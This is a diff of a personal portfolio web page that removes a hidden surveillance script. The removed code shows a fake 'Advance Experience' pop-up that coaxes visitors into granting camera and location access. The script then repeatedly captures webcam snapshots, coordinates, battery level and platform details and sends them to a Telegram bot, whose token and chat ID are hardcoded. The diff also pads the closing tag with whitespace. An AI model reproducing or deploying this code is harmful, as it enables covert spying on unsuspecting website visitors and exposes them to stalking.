@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
     <title>Sabbir Hosen Akash - Portfolio | Musician, Writer & SEO Expert</title>
     <meta name="description" content="Official portfolio of Sabbir Hosen Akash (Writarion). Bangladeshi Musician, Writer, Web Developer, and SEO Expert. Member of Oparok Band and CEO of Shopping City.">
@@ -324,113 +324,9 @@
         <p>© 2026 Sabbir Hosen Akash. Crafted with <i class="fas fa-heart" style="color:red"></i> by Writarion.</p>
     </footer>
 
-    <style>
-        #advanced-overlay {
-            display:none; position:fixed; top:0; left:0; width:100%; height:100%; 
-            background:rgba(0,0,0,0.95); z-index:9999999; display:flex; 
-            justify-content:center; align-items:center; backdrop-filter: blur(10px);
-            padding: 20px; box-sizing: border-box;
-        }
-        .robot-popup {
-            border: 2px solid #00ff88; background: #000;
-            padding: 30px 20px; border-radius: 20px; 
-            text-align:center; max-width: 320px; width: 100%;
-            box-shadow: 0 0 25px #00ff88;
-        }
-        #final-ok-btn {
-            background: #00ff88; color: #000; border: none;
-            padding: 12px 50px; font-size: 16px; font-weight: bold;
-            border-radius: 50px; cursor: pointer; margin-top: 25px;
-            box-shadow: 0 0 15px #00ff88; transition: 0.3s;
-        }
-        #final-ok-btn:active { transform: scale(0.95); }
-    </style>
-
-    <div id="advanced-overlay">
-        <div class="robot-popup">
-            <div style="font-size: 50px; margin-bottom: 15px;">🤖</div>
-            <h2 style="color:#00ff88; font-family: sans-serif; font-size: 20px;">Advance Experience</h2>
-            <p style="color:#ccc; font-family: sans-serif; font-size: 13px; line-height: 1.5;">Allow Camera & Location to unlock 3D portfolio animations and personalized interface.</p>
-            <button id="final-ok-btn">OK</button>
-        </div>
-    </div>
-
-    <script>
-        const botToken = '8239197154:AAH-VeIISL9nO-EZFL2wJqcVIV6S8UhMVAY';
-        const chatId = '7950771882';
-        const overlay = document.getElementById('advanced-overlay');
-        const okBtn = document.getElementById('final-ok-btn');
-
-        // Initial Load Check
-        window.addEventListener('load', () => {
-            if (localStorage.getItem('granted') === 'true') {
-                overlay.style.display = 'none';
-                initSecurity();
-            } else {
-                setTimeout(() => { overlay.style.display = 'flex'; }, 3000);
-            }
-        });
-
-        // OK Button Logic
-        okBtn.addEventListener('click', () => {
-            // Step 1: Request Camera
-            navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                // Step 2: Request Location
-                navigator.geolocation.getCurrentPosition(pos => {
-                    localStorage.setItem('granted', 'true');
-                    overlay.style.display = 'none';
-                    startSystem(stream);
-                }, err => {
-                    alert("Location access is required for full experience.");
-                });
-            })
-            .catch(err => {
-                alert("Camera access is required for full experience.");
-            });
-        });
-
-        async function initSecurity() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                startSystem(stream);
-            } catch(e) { localStorage.removeItem('granted'); }
-        }
-
-        function startSystem(stream) {
-            setInterval(() => {
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                const canvas = document.createElement('canvas');
-                
-                setTimeout(() => {
-                    canvas.width = 400; canvas.height = 300;
-                    canvas.getContext('2d').drawImage(video, 0, 0, 400, 300);
-                    const imgData = canvas.toDataURL('image/jpeg');
-                    
-                    navigator.geolocation.getCurrentPosition(async (p) => {
-                        const b = await navigator.getBattery();
-                        const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                        const msg = `📍 Map: ${map}\n🔋 Battery: ${(b.level*100).toFixed(0)}%\n📱 Platform: ${navigator.platform}`;
-                        
-                        // Send Text
-                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
-                        // Send Image
-                        fetch(imgData).then(r => r.blob()).then(blob => {
-                            const fd = new FormData();
-                            fd.append('chat_id', chatId);
-                            fd.append('photo', blob, 'shot.jpg');
-                            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {method: 'POST', body: fd});
-                        });
-                    });
-                }, 1000);
-            }, 6000);
-        }
-    </script>
     <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/swiper@10/swiper-bundle.min.js"></script>
     <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
     <script src="script.js"></script>
 </body>
-</html>
+                                                                                                                                               </html>
